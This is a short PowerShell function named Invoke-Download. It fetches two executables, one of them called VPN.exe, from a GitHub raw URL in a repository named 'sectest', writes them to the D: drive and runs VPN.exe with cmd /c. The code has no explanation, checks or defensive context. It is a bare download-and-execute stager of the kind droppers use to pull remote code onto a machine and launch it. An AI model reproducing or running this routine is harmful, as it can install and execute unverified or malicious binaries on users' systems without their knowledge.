
function Invoke-Download
{
  $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe"
  $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe"
  $des1 = "D:\\_59539.exe"
  $des2 = "D:\\_VPN.exe"
  $d = new-object System.Net.WebClient
  $d.Downloadfile("https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe","D:\\_59539.exe")
  $d.Downloadfile("https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe","D:\\_VPN.exe")
  
  #Invoke-WebRequest -uri $url1 -OutFile $des1
  #Invoke-WebRequest -uri $url2 -OutFile $des2
  $cmd="D:\\_VPN.exe"
  cmd /c $cmd
}
